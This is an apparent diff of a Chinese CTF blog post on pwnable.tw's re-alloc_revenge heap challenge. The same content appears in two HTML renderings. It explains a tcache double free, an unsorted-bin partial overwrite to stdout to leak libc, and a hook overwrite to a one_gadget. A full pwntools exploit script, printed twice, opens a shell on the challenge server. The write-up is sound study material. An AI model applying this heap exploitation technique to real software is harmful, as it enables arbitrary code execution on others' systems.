+<li>此外，由于后续的操作需要保持unsorted bin中和tcache bin中同时存在该伪造的unsorted bin，从而能从该tcache中分配到位于<code>stdout</code>结构体的内存，所以要在前面提到的<code>free(remainder)</code>形成的tcache bin初形成该chunk的double free，从而在分配该处的chunk时仍能将它保留在tcache中。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tcache bin &#x3D;&#x3D;&gt; +--------+ &lt;--victim_chunk                      tcache bin &#x3D;&#x3D;&gt; +--------+&lt;--same victim_chunk</span><br><span class="line">                 |        |                   after malloc                      |        |</span><br><span class="line">                 +--------+&lt;--+            &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;                 +--------+</span><br><span class="line">                 |fd |    |   |                                                 |        |</span><br><span class="line">                 +--------+   |                                                 +--------+</span><br><span class="line">                   |          |</span><br><span class="line">                   +----------+</span><br></pre></td></tr></table></figure></li>
 <li>进一步地，由于<code>alloc</code>会对输入地字符串强制添加末尾<code>\x00</code>，从而会将上一步中提到的double free链（也就是该tache bin的fd）的低字节覆盖为<code>\x00</code>，这里需要将该chunk的地址保持为低字节是<code>\x00</code>，从而即使低字节被覆盖也不影响double free链，而做法就是在最开始得时候分配一定size的chunk并free到tcache中去（其实这里的chunk在最后的exploite也会用到，因为那时unsorted bin已经被破坏了，不能分配tcache或者fastbin中没有的chunk，否则会造成从unsorted bin中取而报错）。</li>
-<li>在伪造好相应的chunk后，分配并释放到unsorted bin中，再用uaf进行partial overwrite <code>unsorted bin-&gt;fd</code>为<code>stdout</code>(bruteforce 4 bits)，然后再从相应tcache bin中取出该chunk，使得tcache bin指向stdout<pre><code class="shell">tcache bin ==&gt; +--------+ &lt;--victim_chunk             |
-             |        |                               |
-             +--------+                               |
-             |fd |    |                               |
-             +--------+                               |
-               |                                      |
-               +----------&gt; +--------+ &lt;--stdout      |
-                            |_flags  |                |
-                            +--------+                |
-                            |        |                |
-                            +--------+                |   after malloc
------------------------------------------------------ +  =============&gt; tcache bin ==&gt; +--------+ &lt;--stdout
-unsorted bin ==&gt; +--------+ &lt;--same victim_chunk      |                                |_flags  |
-               |        |                             |                                +--------+
-               +--------+                             |                                |        |
-               |fd | bk |--------&gt; main_arena         |                                +--------+        
-               +--------+                             |                         
-                 |                                    |
-                 +----------&gt; +--------+ &lt;--stdout    |
-                              |_flags  |              |
-                              +--------+              |
-                              |        |              |
-                              +--------+              |                  </code></pre>
-</li>
+<li>在伪造好相应的chunk后，分配并释放到unsorted bin中，再用uaf进行partial overwrite <code>unsorted bin-&gt;fd</code>为<code>stdout</code>(bruteforce 4 bits)，然后再从相应tcache bin中取出该chunk，使得tcache bin指向stdout<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">tcache bin ==&gt; +--------+ &lt;--victim_chunk             |</span><br><span class="line">               |        |                               |</span><br><span class="line">               +--------+                               |</span><br><span class="line">               |fd |    |                               |</span><br><span class="line">               +--------+                               |</span><br><span class="line">                 |                                      |</span><br><span class="line">                 +----------&gt; +--------+ &lt;--stdout      |</span><br><span class="line">                              |_flags  |                |</span><br><span class="line">                              +--------+                |</span><br><span class="line">                              |        |                |</span><br><span class="line">                              +--------+                |   after malloc</span><br><span class="line"> ----------------------------------------------------- +  =============&gt; tcache bin ==&gt; +--------+ &lt;--stdout</span><br><span class="line">unsorted bin ==&gt; +--------+ &lt;--same victim_chunk      |                                |_flags  |</span><br><span class="line">                 |        |                             |                                +--------+</span><br><span class="line">                 +--------+                             |                                |        |</span><br><span class="line">                 |fd | bk |--------&gt; main_arena         |                                +--------+        </span><br><span class="line">                 +--------+                             |                         </span><br><span class="line">                   |                                    |</span><br><span class="line">                   +----------&gt; +--------+ &lt;--stdout    |</span><br><span class="line">                                |_flags  |              |</span><br><span class="line">                                +--------+              |</span><br><span class="line">                                |        |              |</span><br><span class="line">                                +--------+              |</span><br></pre></td></tr></table></figure></li>
 <li>这个时候只要分配stdout出的chunk就能修改相应的stdout结构体，达到输出数据从而leak libc的目的。</li>
 <li>之后因为unsorted bin被破坏的缘故，并且仅能使用一个heap进行exploite（另一个heap不能被free，否则会报错）和只能通过bins中已有的chunk进行利用，分配到<code>__realloc_hook</code>处的chunk，将<code>__realloc_hook</code>改为<code>malloc</code>，再将<code>__malloc_hook</code>改为<code>one_gadget</code>（为了调整栈帧，使得<code>[rsp + 0x70] == NULL</code>。</li>
 <li>触发<code>realloc</code>来getshell。</li>
 </ul>
-<blockquote>
-<p>exp</p>
-</blockquote>
-<pre><code class="python"># context.log_level = &quot;debug&quot;
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(index, size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Data:"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span><span class="params">(index, size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size:"</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Data:"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>, str(index))</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x1e7570</span></span><br><span class="line">realloc_hook_offset = libc.symbols[<span class="string">"__realloc_hook"</span>]</span><br><span class="line">malloc_offset = libc.symbols[<span class="string">"malloc"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># make the lowest byte of bins[1]'s address be \x00</span></span><br><span class="line">        <span class="comment"># also provide chunks for exploite since at the very end the unsorted bin is broken, we can only use the chunk in the tcache</span></span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x28</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># three freed tcache bins size = [0x60, 0x40, 0x20]</span></span><br><span class="line">        <span class="comment"># bins[0] and bins[2] have the same address (both size area are 0x20)</span></span><br><span class="line">        <span class="comment"># bins[1] is right next to bins[0] and bins[2]</span></span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">        realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">        realloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># make double free on bins[1]</span></span><br><span class="line">        <span class="comment"># thus we can use two same chunk on size 0x40 for the following exploit</span></span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">        realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">        alloc(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        realloc(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">"B"</span> * <span class="number">0x10</span>)</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># alloc space for unsorted bin</span></span><br><span class="line">        <span class="comment"># make fake unstored bin's next chunk point to exactly a valid chunk</span></span><br><span class="line">        <span class="comment"># free 10 chunks(actually only 9 can be seen in the bins while debugging, why?)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            alloc(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">            realloc(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">            free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># alloc bins[0] to overwrite the size area of bins[1] into 0x441(8 * 0x80 + 0x40 + 0x1)</span></span><br><span class="line">        <span class="comment"># then alloc bins[1] and free it to unsorted bin</span></span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">"D"</span> * <span class="number">0x18</span> + p64(<span class="number">0x441</span>))</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        alloc(<span class="number">1</span>, <span class="number">0x38</span>, <span class="string">"DDDD"</span>)</span><br><span class="line">        realloc(<span class="number">1</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># partially write the unsorted bin-&gt;fd into stdout(bruteforce 4 bits)</span></span><br><span class="line">        <span class="comment"># make the tcache bins whose size is 0x40 point to stdout</span></span><br><span class="line">        realloc(<span class="number">1</span>, <span class="number">0x38</span>, p16(<span class="number">0x5760</span>))</span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">"DDDD"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># alloc the chunk at stdout</span></span><br><span class="line">        <span class="comment"># make _flags = 0x7fdf0ec12760 ... to invoke data print</span></span><br><span class="line">        <span class="comment"># _flags = MAGIC                    # 0xfbad0000 </span></span><br><span class="line">        <span class="comment"># _flags &amp;= ~_IO_NO_WRITES          # _flags = 0xfbad0000 </span></span><br><span class="line">        <span class="comment"># _flags |= _IO_CURRENTLY_PUTTING   # _flags = 0xfbad0800</span></span><br><span class="line">        <span class="comment"># _flags |= _IO_IS_APPENDING        # _flags = 0xfbad1800</span></span><br><span class="line">        <span class="comment"># _IO_read_ptr = 0, </span></span><br><span class="line">        <span class="comment"># _IO_read_end = 0, </span></span><br><span class="line">        <span class="comment"># _IO_read_base = 0</span></span><br><span class="line">        <span class="comment"># _IO_write_base = 0x7ffff7dd0700</span></span><br><span class="line">        <span class="comment"># _IO_write_ptr = 0x7ffff7dd07e3</span></span><br><span class="line">        <span class="comment"># thus data between _IO_write_base and _IO_write_ptr will be print out</span></span><br><span class="line">        realloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">        free(<span class="number">0</span>)</span><br><span class="line">        alloc(<span class="number">0</span>, <span class="number">0x38</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak libc</span></span><br><span class="line">        string = p.recv(<span class="number">16</span>)</span><br><span class="line">        print(string)</span><br><span class="line">        <span class="keyword">if</span> string[<span class="number">0</span>] == <span class="string">"$"</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> _pwn_remote == <span class="number">0</span>:</span><br><span class="line">                p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10310</span>)</span><br><span class="line">            <span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">                gdb.attach(p)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        libc_addr = u64(string[<span class="number">8</span>:])</span><br><span class="line">        libc_base = libc_addr - offset</span><br><span class="line">        realloc_hook = libc_base + realloc_hook_offset</span><br><span class="line">        libc_malloc = libc_base + malloc_offset</span><br><span class="line">        one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> _pwn_remote == <span class="number">0</span>:</span><br><span class="line">            p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10310</span>)</span><br><span class="line">        <span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"realloc_hook: "</span> + hex(realloc_hook))</span><br><span class="line">success(<span class="string">"libc_malloc: "</span> + hex(libc_malloc))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># make heap[1] == NULL (cannot use heap[0] any more)</span></span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">"A"</span> * <span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use the 0x80 tcache and prepared tcache</span></span><br><span class="line"><span class="comment"># create three tcache bins = [0x80, 0x50, 0x30], bins[0] and bins[2] are the same (0x30)</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use bins[2] to overwrite the size area and fd of bins[1] to  0x51 and realloc_hook_addr</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">"A"</span> * <span class="number">0x28</span> + p64(<span class="number">0x51</span>) + p64(realloc_hook))</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make tcache bins in size 0x50 point to realloc_hook</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x48</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">"BBBB"</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make realloc_hook = malloc, malloc_hook = one_gadget</span></span><br><span class="line"><span class="comment"># then the call will be realloc ==&gt; realloc_hook(malloc) ==&gt; malloc_hook(one_gadget)</span></span><br><span class="line"><span class="comment"># because three "push"'s in malloc will help to satisfy the one_gadget condition that [rsp + 0x70] == NULL </span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x48</span>, p64(libc_malloc) + p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># use realloc to trigger</span></span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use vps to get flag</span></span><br><span class="line"><span class="comment"># p.sendline("cat /home/re-alloc_revenge/flag")</span></span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-def alloc(index, size, data):
-    p.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)
-    p.sendlineafter(&quot;Index:&quot;, str(index))
-    p.sendlineafter(&quot;Size:&quot;, str(size))
-    p.sendafter(&quot;Data:&quot;, data)
-
-def realloc(index, size, data):
-    p.sendlineafter(&quot;Your choice: &quot;, &quot;2&quot;)
-    p.sendlineafter(&quot;Index:&quot;, str(index))
-    p.sendlineafter(&quot;Size:&quot;, str(size))
-    if size != 0:
-        p.sendafter(&quot;Data:&quot;, data)
-
-def free(index):
-    p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)
-    p.sendlineafter(&quot;Index:&quot;, str(index))
-
-offset = 0x1e7570
-realloc_hook_offset = libc.symbols[&quot;__realloc_hook&quot;]
-malloc_offset = libc.symbols[&quot;malloc&quot;]
-one_gadget_offset = 0x106ef8
-
-while True:
-    try:
-        # make the lowest byte of bins[1]&#39;s address be \x00
-        # also provide chunks for exploite since at the very end the unsorted bin is broken, we can only use the chunk in the tcache
-        alloc(0, 0x28, &quot;AAAA&quot;)
-        free(0)
-        alloc(0, 0x48, &quot;AAAA&quot;)
-        free(0)
-
-        # three freed tcache bins size = [0x60, 0x40, 0x20]
-        # bins[0] and bins[2] have the same address (both size area are 0x20)
-        # bins[1] is right next to bins[0] and bins[2]
-        alloc(0, 0x58, &quot;AAAA&quot;)
-        realloc(0, 0, &quot;&quot;)
-        realloc(0, 0x18, &quot;BBBB&quot;)
-        free(0)
-
-        # make double free on bins[1]
-        # thus we can use two same chunk on size 0x40 for the following exploit
-        alloc(0, 0x38, &quot;AAAA&quot;)
-        realloc(0, 0, &quot;&quot;)
-        alloc(1, 0x38, &quot;BBBB&quot;)
-        free(0)
-        realloc(1, 0x38, &quot;B&quot; * 0x10)
-        free(1)
-
-        # alloc space for unsorted bin
-        # make fake unstored bin&#39;s next chunk point to exactly a valid chunk
-        # free 10 chunks(actually only 9 can be seen in the bins while debugging, why?)
-        for i in range(9):
-            alloc(1, 0x68, &quot;AAAA&quot;)
-            realloc(1, 0x78, &quot;AAAA&quot;)
-            free(1)
-
-        # alloc bins[0] to overwrite the size area of bins[1] into 0x441(8 * 0x80 + 0x40 + 0x1)
-        # then alloc bins[1] and free it to unsorted bin
-        alloc(0, 0x58, &quot;D&quot; * 0x18 + p64(0x441))
-        free(0)
-        alloc(1, 0x38, &quot;DDDD&quot;)
-        realloc(1, 0, &quot;&quot;)
-
-        # partially write the unsorted bin-&gt;fd into stdout(bruteforce 4 bits)
-        # make the tcache bins whose size is 0x40 point to stdout
-        realloc(1, 0x38, p16(0x5760))
-        alloc(0, 0x38, &quot;DDDD&quot;)
-
-        # alloc the chunk at stdout
-        # make _flags = 0x7fdf0ec12760 ... to invoke data print
-        # _flags = MAGIC                    # 0xfbad0000 
-        # _flags &amp;= ~_IO_NO_WRITES          # _flags = 0xfbad0000 
-        # _flags |= _IO_CURRENTLY_PUTTING   # _flags = 0xfbad0800
-        # _flags |= _IO_IS_APPENDING        # _flags = 0xfbad1800
-        # _IO_read_ptr = 0, 
-        # _IO_read_end = 0, 
-        # _IO_read_base = 0
-        # _IO_write_base = 0x7ffff7dd0700
-        # _IO_write_ptr = 0x7ffff7dd07e3
-        # thus data between _IO_write_base and _IO_write_ptr will be print out
-        realloc(0, 0x18, &quot;AAAA&quot;)
-        free(0)
-        alloc(0, 0x38, p64(0xfbad1800) + p64(0) * 3)
-
-        # leak libc
-        string = p.recv(16)
-        print(string)
-        if string[0] == &quot;$&quot;:
-            p.close()
-            if _pwn_remote == 0:
-                p = process(argv=[_proc], env=_setup_env())
-            else:
-                p = remote(&#39;chall.pwnable.tw&#39;, 10310)
-            if _debug != 0:
-                gdb.attach(p)
-            continue
-
-        libc_addr = u64(string[8:])
-        libc_base = libc_addr - offset
-        realloc_hook = libc_base + realloc_hook_offset
-        libc_malloc = libc_base + malloc_offset
-        one_gadget = libc_base + one_gadget_offset
-
-        break
-
-    except:
-        p.close()
-        if _pwn_remote == 0:
-            p = process(argv=[_proc], env=_setup_env())
-        else:
-            p = remote(&#39;chall.pwnable.tw&#39;, 10310)
-        if _debug != 0:
-            gdb.attach(p)
-
-
-success(&quot;libc_base: &quot; + hex(libc_base))
-success(&quot;realloc_hook: &quot; + hex(realloc_hook))
-success(&quot;libc_malloc: &quot; + hex(libc_malloc))
-success(&quot;one_gadget: &quot; + hex(one_gadget))
-
-# make heap[1] == NULL (cannot use heap[0] any more)
-realloc(1, 0x18, &quot;A&quot; * 0x10)
-free(1)
-
-# use the 0x80 tcache and prepared tcache
-# create three tcache bins = [0x80, 0x50, 0x30], bins[0] and bins[2] are the same (0x30)
-alloc(1, 0x78, &quot;AAAA&quot;)
-realloc(1, 0, &quot;&quot;)
-realloc(1, 0x28, &quot;BBBB&quot;)
-free(1)
-
-# use bins[2] to overwrite the size area and fd of bins[1] to  0x51 and realloc_hook_addr
-alloc(1, 0x78, &quot;A&quot; * 0x28 + p64(0x51) + p64(realloc_hook))
-realloc(1, 0x18, &quot;AAAA&quot;)
-free(1)
-
-# make tcache bins in size 0x50 point to realloc_hook
-alloc(1, 0x48, &quot;AAAA&quot;)
-realloc(1, 0x18, &quot;BBBB&quot;)
-free(1)
-
-# make realloc_hook = malloc, malloc_hook = one_gadget
-# then the call will be realloc ==&gt; realloc_hook(malloc) ==&gt; malloc_hook(one_gadget)
-# because three &quot;push&quot;&#39;s in malloc will help to satisfy the one_gadget condition that [rsp + 0x70] == NULL 
-alloc(1, 0x48, p64(libc_malloc) + p64(one_gadget))
-
-# use realloc to trigger
-realloc(1, 0, &quot;&quot;)
-
-# use vps to get flag
-# p.sendline(&quot;cat /home/re-alloc_revenge/flag&quot;)
-# print(p.recv())
-
-p.interactive()</code></pre>
-<blockquote>
-<p>小结</p>
-</blockquote>
-<ul>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
 <li>新姿势，<code>unsorted bin-&gt;fd</code>的partial overwrite改成<code>stdout</code>，在没有show的情况下进行leak libc</li>
 <li>只有两个heap外加只有realloc操作再加各种崩坏的unsorted bin和tcache double free check，以及需要bruteforce，调试+写exp的过程对我来说那叫一个…</li>
 <li>貌似还有一种改tcache struct的做法，目前还没研究，以后有时间搞一下</li>
 </ul>
-<blockquote>
-<p>参考资料</p>
-</blockquote>
-<ol>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
 <li>思路来源，但是貌似这个脚本有问题：<a href="http://www.ntype.club/re-alloc_revenge/" target="_blank" rel="noopener">http://www.ntype.club/re-alloc_revenge/</a></li>
 <li>改tcache stuct的做法（还没学着调过）：<a href="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/" target="_blank" rel="noopener">https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/</a></li>
 <li>利用stdout进行输出：<a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/tcache_attack-zh.md" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/tcache_attack-zh.md</a></li>
 <li>同上：<a href="https://n0va-scy.github.io/2019/09/21/IO_FILE/" target="_blank" rel="noopener">https://n0va-scy.github.io/2019/09/21/IO_FILE/</a></li>
 <li>glibc2.29源码：<a href="https://elixir.bootlin.com/glibc/glibc-2.29/source" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.29/source</a></li>
 </ol>
-</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">Nop</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2020/03/18/pwn-heap-re-alloc-revenge/">http://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="http://n0nop.com">Nop的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tags"></i><a href="/tags/CTF/">CTF</a><a href="/tags/pwn/">pwn</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2020/03/18/CONFidence-CTF-re-Locked-PE/">&lt; CONFidence CTF re: Locked PE</a><a class="next" href="/2020/03/06/pwn-heap-re-alloc/">pwn heap: re-alloc &gt;</a></div></section><footer><p>Copyright © 2016 - 2020 <a href="/." rel="nofollow">Nop</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" 